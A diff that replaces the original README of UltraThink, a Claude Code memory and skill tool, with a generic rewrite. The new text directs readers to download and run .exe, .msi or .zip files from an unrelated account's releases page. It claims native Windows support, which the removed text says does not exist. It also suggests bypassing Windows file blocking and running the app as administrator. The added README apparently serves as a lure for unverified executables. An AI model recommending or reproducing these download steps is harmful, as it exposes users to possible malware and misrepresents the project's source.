@@ -1,779 +1,220 @@
-<p align="center">
-  <img src="docs/assets/ultrathink-logo-1.png" alt="UltraThink" width="600" />
-</p>
+# ⚡ ultrathink-oss - Stay organized across every session
 
-<h1 align="center">UltraThink</h1>
-<p align="center">
-  <strong>A Workflow OS for Claude Code, with Codex-aware project integration</strong><br />
-  Persistent memory, 4-layer skill mesh, privacy hooks, and an observability dashboard — all running inside your CLI.
-</p>
+[![Download UltraThink](https://img.shields.io/badge/Download%20UltraThink-Visit%20Releases-brightgreen?style=for-the-badge)](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
 
-<p align="center">
-  <a href="#quickstart">Quickstart</a> &bull;
-  <a href="#architecture">Architecture</a> &bull;
-  <a href="#features">Features</a> &bull;
-  <a href="#database-schema">Schema</a> &bull;
-  <a href="#configuration">Configuration</a> &bull;
-  <a href="#contributing">Contributing</a>
-</p>
+## 🚀 Quick Start
 
----
+UltraThink helps you keep your work in one place. It runs on Windows and gives you a simple way to start, load your settings, and keep your workflow the same each time you use it.
 
-## What is UltraThink?
+If you want to get the app, use the release page here:
 
-UltraThink transforms Claude Code from a stateless assistant into a **persistent, skill-aware agent** that remembers your preferences, enforces your coding standards, and adapts to your workflow — across sessions.
+[Visit the download page](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
 
-This repo also ships a Codex-facing `AGENTS.md`, so Codex can inherit the same skill lookup, memory discipline, privacy rules, and agent roster when working inside this codebase. Claude-specific hooks and statusline behavior remain Claude-native.
+## 💻 What UltraThink Does
 
-```
-You ──► Claude Code ──► UltraThink hooks fire ──► Skills matched, memories recalled
-                                                  ──► Context injected into Claude
-                                                  ──► Better, personalized responses
-```
+UltraThink is a workflow tool for Claude Code users. It keeps useful memory between sessions, stores your project habits, and helps the app follow your preferred way of working.
 
-### Why?
+It also includes:
 
-Claude Code is powerful but stateless. Every session starts fresh. UltraThink fixes that:
+- a memory layer for saved context
+- a skill system for common tasks
+- a privacy section for local control
+- a dashboard for viewing activity
+- support for Codex project files
 
-- **Memory**: Claude remembers your architectural decisions, patterns, and preferences across sessions
-- **Skills**: 388 domain skills auto-activate based on intent detection (build, debug, deploy, design...)
-- **Privacy**: Hooks block access to `.env`, `.pem`, credentials before Claude sees them
-- **Observability**: Dashboard shows memory usage, skill activations, hook events, and token costs
-- **Quality gates**: Auto-format on edit, JSON validation, shell syntax checking
+## 📥 Download and Run on Windows
 
----
+1. Open the release page:
+   [https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
 
-## Requirements
+2. Find the latest release at the top of the page.
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | macOS or Linux (bash required). Windows: WSL2 only — native PowerShell is not supported. |
-| **Runtime** | Node.js 18+ and npm |
-| **CLI tools** | `jq` (install via `brew install jq` or `apt install jq`), `grep`, `sed` |
-| **Claude Code** | `npm install -g @anthropic-ai/claude-code` |
-| **Database** | PostgreSQL ([Neon](https://neon.tech) free tier works) — required for memory + dashboard |
+3. Under **Assets**, look for the Windows file. It will often end in one of these names:
+   - `.exe`
+   - `.msi`
+   - `.zip`
 
----
+4. Download the file to your computer.
 
-## What UltraThink Does for Your AI Agent
+5. If you downloaded an `.exe` or `.msi` file, double-click it to start the setup.
 
-Out of the box, Claude Code is stateless — every session starts from zero. UltraThink upgrades it into a persistent, context-aware agent:
+6. If you downloaded a `.zip` file:
+   - right-click it
+   - choose **Extract All**
+   - open the extracted folder
+   - run the app file inside
 
-| Capability | Without UltraThink | With UltraThink |
-|---|---|---|
-| **Memory** | Forgets everything between sessions | Remembers decisions, preferences, patterns across sessions |
-| **Skills** | Generic responses for every task | 388 domain skills auto-activate based on what you're doing |
-| **Quality** | No guardrails on edits | Auto-formats code, validates JSON/shell, blocks credential access |
-| **Observability** | Black box | Dashboard with memory browser, skill mesh, hook stats, token costs |
-| **Context** | You repeat yourself every session | Intent detection + memory recall inject relevant context automatically |
+7. Follow the on-screen steps to finish setup.
 
-Works with **Claude Code** (hooks + statusline) and **Codex** (AGENTS.md + skills).
+8. Open UltraThink from the Start menu or from the folder where you installed it.
 
----
+## 🪟 Windows Requirements
 
-## Quickstart
+UltraThink is built for modern Windows systems. A normal home or work PC should work fine if it meets these basics:
 
-### One-liner install
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- at least 500 MB of free disk space
+- internet access for the first download
+- permission to install apps on your computer
 
-```bash
-git clone https://github.com/InugamiDev/ultrathink-oss.git && cd ultrathink-oss && ./scripts/setup.sh && ./scripts/install.sh
-```
+If your computer is managed by work or school, you may need admin access to install it.
 
-That's it. Open `claude` in any project and UltraThink is active.
+## 🧭 First-Time Setup
 
-### Step-by-step install
+When you open UltraThink for the first time, follow these steps:
 
-<details>
-<summary>Click to expand full setup walkthrough</summary>
+1. Start the app.
+2. Read any setup prompts on the screen.
+3. Pick your folder or project if the app asks for one.
+4. Set your preferred options.
+5. Save the settings.
 
-#### 1. Prerequisites
+If the app uses Claude Code on your machine, it may ask you to connect to your local project folder or confirm a few workspace paths. Use the folder where you keep your code or notes.
 
-| Requirement | Install |
-|---|---|
-| Node.js 18+ | [nodejs.org](https://nodejs.org) |
-| Claude Code CLI | `npm install -g @anthropic-ai/claude-code` |
-| PostgreSQL | [neon.tech](https://neon.tech) free tier (required for memory + dashboard) |
-| jq | `brew install jq` (macOS) or `apt install jq` (Linux) |
-
-#### 2. Clone and setup
-
-```bash
-git clone https://github.com/InugamiDev/ultrathink-oss.git
-cd ultrathink-oss
-
-# Installs dependencies, creates .env template, runs database migrations
-./scripts/setup.sh
-```
-
-Edit `.env` with your Neon connection string before proceeding.
-
-#### 3. Install into Claude Code
-
-```bash
-# Symlinks skills, hooks, agents, references into ~/.claude/
-# Creates ~/.ultrathink/ for vault, forge state, and decisions
-./scripts/install.sh
-```
-
-**Installer flags:**
-- `--dry-run` — preview what would change without modifying anything
-- `--uninstall` — fully remove all UltraThink symlinks and hooks
-- `--no-identity` — skip modifying your CLAUDE.md
-- `--yes` / `-y` — auto-approve all prompts
-
-#### 4. Verify
-
-```bash
-claude
-# You should see the UltraThink statusline with memory count, skills, and usage
-# Try: "explain how UltraThink hooks work" — teaching mode should auto-activate
-```
-
-</details>
-
-### Use with Codex CLI
-
-```bash
-codex
-# Codex reads AGENTS.md automatically in this repository
-
-# Regenerate after major CLAUDE.md changes
-./scripts/sync-editors.sh --codex
-```
-
-Codex inherits UltraThink's operating model through `AGENTS.md`, `.claude/skills/`, `.claude/references/`, and the repo MCP config.
-
-### Tiers
-
-This is the **OSS** tier — skills, memory, hooks, and /forge guided mode. Free and open source. Builder and Core tiers with additional features are coming soon.
-
-### Start the dashboard
-
-```bash
-npm run dashboard:dev
-# Open http://localhost:3333
-```
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        Claude Code CLI                       │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │
-│  │ SessionStart  │  │ PromptSubmit │  │ PostToolUse      │  │
-│  │              │  │              │  │                  │  │
-│  │ memory-start │  │ prompt-      │  │ quality-gate     │  │
-│  │ codeintel-   │  │ analyzer.ts  │  │ codeintel-index  │  │
-│  │ check        │  │ memory-recall│  │ memory-auto-save │  │
-│  └──────┬───────┘  └──────┬───────┘  │ tool-observe     │  │
-│         │                 │          │ context-monitor  │  │
-│         │                 │          │ privacy-hook     │  │
-│         │                 │          └──────────────────┘  │
-│         ▼                 ▼                                 │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              Neon Postgres (pgvector + pg_trgm)      │   │
-│  │                                                      │   │
-│  │  memories ← memory_tags ← memory_relations          │   │
-│  │  sessions ← skill_usage ← hook_events               │   │
-│  │  plans ← tasks ← journals ← decisions               │   │
-│  │  daily_stats, model_pricing                          │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                          ▲                                  │
-│                          │                                  │
-│  ┌───────────────────────┴─────────────────────────────┐   │
-│  │           Next.js 15 Dashboard (:3333)               │   │
-│  │  Memory browser | Skill mesh | Activity feed         │   │
-│  │  Hook stats | Usage tracking | Kanban board          │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                                                              │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              Skill Mesh (4 layers)                    │   │
-│  │                                                      │   │
-│  │  Orchestrators ──► Hubs ──► Utilities ──► Domain     │   │
-│  │  (gsd, plan)    (react,   (refactor,   (nextjs,     │   │
-│  │                  debug)    test)        stripe)      │   │
-│  │                                                      │   │
-│  │  Auto-trigger: intent detection + graph traversal    │   │
-│  │  388 skills, <30ms scoring per prompt                │   │
-│  └─────────────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Hook Lifecycle
-
-| Event | Hook | What it does |
-|-------|------|-------------|
-| **SessionStart** | `memory-session-start.sh` | Recalls memories, loads context |
-| **UserPromptSubmit** | `prompt-submit.sh` | Scores skills, recalls relevant memories, injects context |
-| **PreToolUse** | `privacy-hook.sh` | Blocks access to `.env`, `.pem`, credentials |
-| **PreToolUse** | `agent-tracker-pre.sh` | Tracks spawned subagents for statusline |
-| **PostToolUse** | `post-edit-quality.sh` | Auto-formats (Biome/Prettier), validates JSON/shell |
-| **PostToolUse** | `memory-auto-save.sh` | Saves architectural changes (migrations, schemas, configs) |
-| **PostToolUse** | `tool-observe.sh` | Batches tool usage stats (file append, flushed at session end) |
-| **PostToolUse** | `context-monitor.sh` | Warns at 65%/75% context usage, detects stuck agents |
-| **PostToolUseFailure** | `tool-failure-log.sh` | Logs failures, detects patterns |
-| **PreCompact** | `pre-compact.sh` | Saves transcript state before context compaction |
-| **Stop** | `memory-session-end.sh` | Flushes pending memories, closes session |
-| **Notification** | `desktop-notify.sh` | macOS desktop + Discord notifications |
-
----
-
-## Features
-
-### Memory System
-
-Postgres-backed persistent memory organized as a **Second Brain** with 4 wings:
-
-| Wing | Purpose | Halls |
-|------|---------|-------|
-| `agent` | Who the agent is | core, rules, skills |
-| `user` | Who the user is | profile, preferences, projects |
-| `knowledge` | What has been learned | decisions, patterns, insights, reference |
-| `experience` | What happened | sessions, outcomes, errors |
-
-**3-tier hybrid search** with write-time synonym enrichment:
-
-1. **tsvector** full-text search (best precision)
-2. **pg_trgm** trigram fuzzy matching (typo-tolerant)
-3. **ILIKE** substring fallback
-
-Two-pass ranking with temporal stopword recall, frequency decay protection, and tag-content enrichment ensure the right memory surfaces first.
-
-Memories are scoped by project, categorized (preference, solution, architecture, pattern, insight, decision), and ranked by importance (1-10) and confidence (0-1). An Obsidian vault at `~/.ultrathink/vault/` mirrors the MemPalace structure for human editing.
-
-```bash
-# CLI commands
-npx tsx memory/scripts/memory-runner.ts search "authentication pattern"
-npx tsx memory/scripts/memory-runner.ts save "content" "category" importance
-npx tsx memory/scripts/memory-runner.ts flush
-npx tsx memory/scripts/memory-runner.ts session-start
-```
-
-### LongMemEval Benchmark
-
-The memory system is validated against a LongMemEval-inspired benchmark (50 questions, 5 ability categories):
-
-| Ability | Questions | Pass Threshold | Score |
-|---------|-----------|---------------|-------|
-| Information Extraction | 10 | ≥80% | **100%** |
-| Multi-Session Reasoning | 10 | ≥60% | **100%** |
-| Temporal Reasoning | 10 | ≥60% | **100%** |
-| Knowledge Updates | 10 | ≥70% | **100%** |
-| Abstention | 10 | ≥80% | **100%** |
-
-**50/50 (100%)** — Tests retrieval quality across information extraction, cross-memory synthesis, temporal ordering, knowledge freshness, and refusal-when-uncertain. No LLM in the loop — pure search ranking validation.
-
-```bash
-npx vitest run tests/longmemeval.test.ts
-```
-
-### AAAK — Lossless Shorthand Dialect
-
-AAAK compresses natural language into a structured shorthand that any LLM can decode — ~1.5x compression on recall output, zero information loss.
-
-```
-Natural (~1000 tokens):
-  "Priya manages the Driftwood team: Kai (backend, 3 years), Soren (frontend),
-   Maya (infrastructure), and Leo (junior, started last month). They're building
-   a SaaS analytics platform. Current sprint: auth migration to Clerk."
-
-AAAK (~120 tokens):
-  TEAM: PRI(lead) | KAI(backend,3yr) SOR(frontend) MAY(infra) LEO(junior,new)
-  PROJ: DRIFTWOOD(saas.analytics) | SPRINT: auth.migration→clerk
-```
-
-Used in recall context injection to fit more memories into the token budget. Grammar supports category codes, structural markers (`|`, `→`, `+`, `>`), and automatic abbreviation of common dev terms.
-
-```bash
-# AAAK-compressed context injection
-npx tsx memory/scripts/memory-runner.ts aaak-context
-
-# Programmatic
-recall(scope, { aaak: true })
-```
-
-### Skill Mesh
-
-4-layer architecture with auto-trigger on every prompt:
-
-| Layer | Count | Purpose | Example |
-|-------|-------|---------|---------|
-| **Orchestrator** | 8 | Multi-step workflows | `gsd`, `plan`, `cook` |
-| **Hub** | 18 | Domain coordinators | `react`, `debug`, `test` |
-| **Utility** | 35 | Focused tools | `refactor`, `fix`, `audit` |
-| **Domain** | 64+ | Specific tech | `nextjs`, `stripe`, `drizzle` |
-
-Skills auto-activate via intent detection. The prompt analyzer classifies each prompt into an intent (build, debug, refactor, explore, deploy, test, design, plan) and scores matching skills from `_registry.json`. Top 5 skills are injected as context directives.
-
-### Dashboard
-
-Next.js 15 app with 18 pages:
-
-- `/dashboard` — Stats overview, skill mesh visualization
-- `/memory` — Memory browser with semantic search
-- `/activity` — Hook event feed, memory writes
-- `/hooks` — Performance stats, duplicate detection
-- `/skills` — Registry browser with graph connections
-- `/usage` — Token costs, API quotas
-- `/kanban` — Task board with drag-and-drop
-- `/plans` — Workflow planning
-- `/system` — Health checks
-
-### Desktop Widget
-
-macOS Ubersicht widget showing:
-- Anthropic API usage (5hr/7day quotas)
-- Active session stats
-- Memory count
-- Token costs
-
-### Statusline
-
-3-line Claude Code statusline showing:
-- Model, context %, API quotas
-- Active skills, agent progress
-- Recent hook activity feed
-
----
-
-## Database Schema
-
-### Entity Relationship Diagram
-
-```mermaid
-erDiagram
-    sessions {
-        uuid id PK
-        timestamptz started_at
-        timestamptz ended_at
-        text summary
-        text task_context
-        int memories_created
-        int memories_accessed
-        bigint input_tokens
-        bigint output_tokens
-        bigint cache_read_tokens
-        bigint cache_write_tokens
-        varchar model
-        decimal cost_usd
-    }
-
-    memories {
-        uuid id PK
-        text content
-        varchar category
-        smallint importance
-        decimal confidence
-        varchar scope
-        varchar source
-        uuid session_id FK
-        uuid plan_id FK
-        text file_path
-        vector embedding
-        tsvector search_vector
-        text search_enrichment
-        varchar wing
-        varchar hall
-        smallint layer
-        boolean is_archived
-        boolean is_compacted
-        int access_count
-        timestamptz created_at
-        timestamptz updated_at
-        timestamptz accessed_at
-    }
-
-    memory_tags {
-        uuid memory_id PK,FK
-        varchar tag PK
-    }
-
-    memory_relations {
-        uuid source_id PK,FK
-        uuid target_id PK,FK
-        varchar relation_type
-        decimal strength
-    }
-
-    summaries {
-        uuid id PK
-        varchar scope
-        text summary
-        int memory_count
-        timestamptz date_range_start
-        timestamptz date_range_end
-    }
-
-    plans {
-        uuid id PK
-        varchar title
-        varchar status
-        text file_path
-        text summary
-        uuid session_id FK
-        timestamptz created_at
-        timestamptz archived_at
-    }
-
-    tasks {
-        uuid id PK
-        varchar title
-        text description
-        varchar status
-        smallint priority
-        uuid plan_id FK
-        varchar board
-        int position
-        varchar assignee
-        text_arr labels
-        timestamptz due_date
-    }
-
-    decisions {
-        uuid id PK
-        varchar title
-        text context
-        text decision
-        text consequences
-        text alternatives
-        varchar status
-        uuid superseded_by FK
-    }
-
-    journals {
-        uuid id PK
-        uuid plan_id FK
-        text planned
-        text implemented
-        text blockers
-        text outcomes
-        text lessons
-        text followup_debt
-    }
-
-    hook_events {
-        uuid id PK
-        varchar event_type
-        varchar severity
-        text description
-        text path_accessed
-        varchar action_taken
-        varchar hook_name
-        uuid session_id FK
-    }
-
-    security_incidents {
-        uuid id PK
-        uuid hook_event_id FK
-        varchar title
-        text description
-        varchar status
-        text resolution
-        timestamptz resolved_at
-    }
-
-    skill_usage {
-        uuid id PK
-        varchar skill_id
-        timestamptz invoked_at
-        int duration_ms
-        boolean success
-        text error_message
-        uuid session_id FK
-    }
-
-    daily_stats {
-        date date PK
-        int total_sessions
-        int total_memories_created
-        int total_skills_invoked
-        int total_hook_events
-        int total_tasks_completed
-        jsonb top_skills
-        bigint total_input_tokens
-        bigint total_output_tokens
-        decimal total_cost_usd
-        jsonb cost_by_model
-    }
-
-    model_pricing {
-        varchar model PK
-        decimal input_per_mtok
-        decimal output_per_mtok
-        decimal cache_read_per_mtok
-        decimal cache_write_per_mtok
-        date effective_from
-    }
-
-    sessions ||--o{ memories : "creates"
-    sessions ||--o{ plans : "creates"
-    sessions ||--o{ hook_events : "logs"
-    sessions ||--o{ skill_usage : "tracks"
-
-    memories ||--o{ memory_tags : "tagged"
-    memories ||--o{ memory_relations : "source"
-    memories ||--o{ memory_relations : "target"
-
-    plans ||--o{ tasks : "contains"
-    plans ||--o{ journals : "records"
-    plans ||--o{ memories : "references"
-
-    decisions ||--o| decisions : "supersedes"
-
-    hook_events ||--o| security_incidents : "escalates"
-
-```
-
-### Key Indexes
-
-| Table | Index | Type | Purpose |
-|-------|-------|------|---------|
-| memories | `search_vector` | GIN | Full-text search |
-| memories | `content_trgm` | GIN (trigram) | Fuzzy matching |
-| memories | `embedding` | IVFFlat | Vector similarity |
-| memories | `scope_category` | B-tree | Scoped queries |
-
-### Extensions Required
-
-```sql
-CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
-CREATE EXTENSION IF NOT EXISTS "vector";      -- pgvector
-CREATE EXTENSION IF NOT EXISTS "pg_trgm";     -- trigram fuzzy search
-```
-
----
-
-## Configuration
-
-### Environment Variables
-
-```bash
-# Required
-DATABASE_URL=postgresql://user:pass@host.neon.tech/neondb?sslmode=require
-
-# Dashboard
-NEXT_PUBLIC_APP_URL=http://localhost:3333
-PORT=3333
-
-# Optional — Notifications
-DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
-SLACK_WEBHOOK_URL=https://hooks.slack.com/services/...
-TELEGRAM_BOT_TOKEN=
-TELEGRAM_CHAT_ID=
-
-# Optional — Embedding provider (for vector search)
-OPENAI_API_KEY=
-```
-
-### Project Configuration (`.claude/ck.json`)
-
-```json
-{
-  "project": "ultrathink",
-  "version": "1.0.0",
-  "codingLevel": "practical-builder",
-  "memory": {
-    "provider": "neon",
-    "autoRecall": true,
-    "writePolicy": "selective",
-    "compactionThreshold": 100
-  },
-  "privacyHook": {
-    "enabled": true,
-    "sensitivityLevel": "standard",
-    "logEvents": true
-  },
-  "dashboard": { "port": 3333 }
-}
-```
-
-### Skill Registry
-
-Skills are defined in `.claude/skills/<name>/SKILL.md` and registered in `.claude/skills/_registry.json`:
-
-```json
-{
-  "react": {
-    "layer": "hub",
-    "category": "frontend",
-    "description": "React patterns, hooks, server components",
-    "triggers": ["react", "component", "useState", "useEffect", "jsx"],
-    "linksTo": ["nextjs", "tailwindcss", "testing-library"],
-    "websearch": true
-  }
-}
-```
-
----
-
-## Project Structure
-
-```
-ultrathink/
-├── .claude/
-│   ├── hooks/             # 15+ lifecycle hooks (shell + TypeScript)
-│   │   ├── prompt-analyzer.ts   # Intent detection + skill scoring engine
-│   │   ├── prompt-submit.sh     # UserPromptSubmit orchestrator
-│   │   ├── privacy-hook.sh      # File access control
-│   │   ├── post-edit-quality.sh # Auto-format + validation
-│   │   ├── statusline.sh        # CLI status bar
-│   │   └── ...
-│   ├── skills/            # 388 skill definitions (SKILL.md files)
-│   │   ├── _registry.json # Master skill index with triggers + graph edges
-│   │   ├── react/SKILL.md
-│   │   ├── nextjs/SKILL.md
-│   │   └── ...
-│   ├── agents/            # 10 specialized agent definitions
-│   ├── references/        # Behavioral rules (loaded on demand)
-│   └── commands/          # Slash commands (/usage, /context-tree, etc.)
-├── memory/
-│   ├── migrations/        # 12 SQL migration files (001-012)
-│   ├── src/
-│   │   ├── memory.ts      # Core CRUD + 3-tier search
-│   │   ├── client.ts      # Neon Postgres connection
-│   │   ├── hooks.ts       # Hook event logging
-│   │   ├── analytics.ts   # Usage tracking
-│   │   ├── enrich.ts      # Synonym expansion for search
-│   │   └── plans.ts       # Workflow integration
-│   └── scripts/
-│       ├── memory-runner.ts  # CLI entry point (session-start|save|flush|search)
-│       ├── migrate.ts        # Migration runner
-│       └── ...
-├── dashboard/             # Next.js 15 + Tailwind v4 observability UI
-│   ├── app/               # 18 pages (App Router)
-│   │   ├── dashboard/     # Stats overview
-│   │   ├── memory/        # Memory browser
-│   │   ├── hooks/         # Hook performance
-│   │   ├── skills/        # Skill registry
-│   │   ├── activity/      # Event feed
-│   │   ├── usage/         # Token costs
-│   │   └── ...
-│   └── lib/               # Shared utilities, DB client
-├── widgets/               # Desktop widget (macOS Ubersicht)
-├── scripts/
-│   ├── setup.sh           # One-command project setup
-│   ├── install.sh         # Global ~/.claude/ integration
-│   └── sync-editors.sh    # Regenerate editor/Codex instruction files
-├── docs/                  # 21 documentation files
-├── tests/                 # Vitest test suite
-├── Dockerfile             # Production container build
-└── .github/workflows/     # CI pipeline (lint, typecheck, test)
-```
-
----
-
-## CLI Commands
-
-```bash
-# Setup
-./scripts/setup.sh              # Full project setup
-./scripts/install.sh            # Install into ~/.claude/ globally
-./scripts/install.sh --uninstall     # Remove from ~/.claude/
-./scripts/sync-editors.sh --codex     # Regenerate AGENTS.md for Codex
-./scripts/sync-editors.sh --all       # Refresh all editor instruction files
-
-# Database
-npm run migrate                 # Run all pending migrations
-npm run seed                    # Populate sample data
-
-# Dashboard
-npm run dashboard:dev           # Start dev server (port 3333)
-npm run dashboard:build         # Production build
-
-# Memory
-npx tsx memory/scripts/memory-runner.ts search "query"
-npx tsx memory/scripts/memory-runner.ts flush
-npx tsx memory/scripts/memory-runner.ts compact
-
-# Quality
-npm run lint                    # ESLint
-npm run format                  # Prettier
-npm run typecheck               # TypeScript validation
-npm run test                    # Vitest
-```
-
----
-
-## Self-Hosting
-
-### Option A: Local (recommended for development)
-
-```bash
-git clone https://github.com/InuVerse/ultrathink.git
-cd ultrathink
-./scripts/setup.sh
-# Edit .env with your Neon DATABASE_URL
-npm run migrate
-npm run dashboard:dev
-```
-
-### Option B: Docker
-
-```bash
-docker build -t ultrathink .
-docker run -p 3333:3333 \
-  -e DATABASE_URL="postgresql://..." \
-  ultrathink
-```
-
-### Option C: Existing project integration
-
-You don't need to clone the full repo. The global installer symlinks everything:
-
-```bash
-# Clone once to a permanent location
-git clone https://github.com/InuVerse/ultrathink.git ~/ultrathink
-
-# Install globally
-cd ~/ultrathink && ./scripts/setup.sh && ./scripts/install.sh
-
-# Now every `claude` session has UltraThink capabilities
-```
-
----
-
-## Roadmap
-
-- [ ] SQLite fallback for local-only mode (no Neon required)
-- [ ] `npx ultrathink init` — one-command installer
-- [ ] WebSocket/SSE real-time dashboard updates
-- [ ] Plugin marketplace for community skills
-- [ ] VS Code extension for dashboard access
-- [ ] Multi-user memory isolation
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Quick start for contributors:**
-
-```bash
-git clone https://github.com/InuVerse/ultrathink.git
-cd ultrathink
-./scripts/setup.sh
-npm run test
-```
-
-**Rebuilding hooks after modifications:**
-
-```bash
-cd .claude/hooks && npx tsc --target ES2022 --module ES2022 --moduleResolution node --outDir dist prompt-analyzer.ts
-```
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  Built by <a href="https://github.com/InuVerse">InuVerse</a>
-</p>
+## 🔧 How UltraThink Fits Your Workflow
+
+UltraThink is meant to keep your work stable across sessions. That means it can remember things like:
+
+- your coding style
+- your project rules
+- your preferred task order
+- useful notes from past work
+- project-specific settings
+
+This helps reduce repeated setup when you return later.
+
+## 🧱 Main Parts of the App
+
+### 🧠 Memory
+UltraThink stores useful context so you do not need to repeat the same setup each time. It can keep project notes, habits, and task rules in one place.
+
+### 🛠️ Skill Mesh
+The app uses a multi-layer skill system. In plain terms, it groups common work into clear steps so the right task logic is easy to find.
+
+### 🔐 Privacy Hooks
+UltraThink gives you controls for local use and data handling. This helps you keep personal or project data under your control.
+
+### 📊 Dashboard
+The dashboard shows activity and status in one view. You can use it to check what the app is doing and how your workspace is set up.
+
+### 🤖 Codex Project Support
+UltraThink includes a Codex-facing `AGENTS.md` file so project rules can stay aligned across tools.
+
+## 🗂️ Typical Folder Layout
+
+After setup, your files may look like this:
+
+- `ultrathink-oss/` — main app folder
+- `config/` — app settings
+- `memory/` — saved context and notes
+- `skills/` — task and workflow rules
+- `dashboard/` — display files for status views
+- `docs/` — help files and images
+
+You do not need to edit these folders unless you want to change how the app works.
+
+## ⚙️ Basic Use
+
+Once UltraThink is running, you can use it to:
+
+- keep project rules in one place
+- track work across sessions
+- load saved habits and preferences
+- review task status
+- keep Claude Code aligned with your project needs
+
+If the app asks for a project path, choose the main folder for your work. If you are not sure, choose the folder that contains your files, notes, or source code.
+
+## 🧪 Common File Types You May See
+
+UltraThink may use these file types:
+
+- `.md` for notes and instructions
+- `.json` for saved settings
+- `.yaml` or `.yml` for project config
+- `.txt` for plain notes
+- `.exe` for Windows launch files
+
+You can open most text files with Notepad.
+
+## 🛡️ Safety Tips
+
+Keep your files in a folder you can find again. If the app saves memory or settings, back up the folder from time to time. This helps if you move to a new computer or need to restore your setup.
+
+## ❓ Common Problems
+
+### The app does not open
+- Download the file again from the release page
+- Make sure the download finished
+- Check that Windows did not block the file
+- Try running the app as an administrator
+
+### I cannot find the file
+- Open your Downloads folder
+- Sort by date
+- Look for the newest `.exe`, `.msi`, or `.zip` file
+
+### The app asks for a project folder
+- Choose the main folder for your work
+- If needed, create a new folder for testing
+- Use a folder with files you want the app to manage
+
+### The settings do not save
+- Check that you have write access to the folder
+- Avoid saving inside protected system folders
+- Try a folder in Documents or on your desktop
+
+## 🧩 Configuration
+
+UltraThink can be adjusted with simple config files. Most users only need to change a few items:
+
+- project name
+- save location
+- memory settings
+- skill rules
+- dashboard options
+
+If you want to keep things simple, start with the default settings and only change one item at a time.
+
+## 📚 File Reference
+
+Useful files in the repo may include:
+
+- `AGENTS.md` — instructions for Codex use
+- `docs/assets/ultrathink-logo-1.png` — project logo
+- project config files — app rules and saved preferences
+- dashboard files — status and view data
+
+## 🔄 Updating UltraThink
+
+To update the app on Windows:
+
+1. Go back to the release page:
+   [https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
+
+2. Download the newest version.
+
+3. Close the app if it is open.
+
+4. Install or replace the old files with the new ones.
+
+5. Open the app again and check that your settings are still there.
+
+## 📌 Best Results
+
+For a smooth setup:
+
+- keep the app in one folder
+- use a clear project name
+- back up your settings folder
+- keep your project files in a fixed path
+- use the same workspace each time
+
+## 🧰 For Advanced Users
+
+If you are comfortable with files, you can tune UltraThink for different projects by changing its config, memory, and skill files. This lets you reuse the same workflow for more than one project without rebuilding everything from scratch.
+
+## 📎 Release Page
+
+[https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
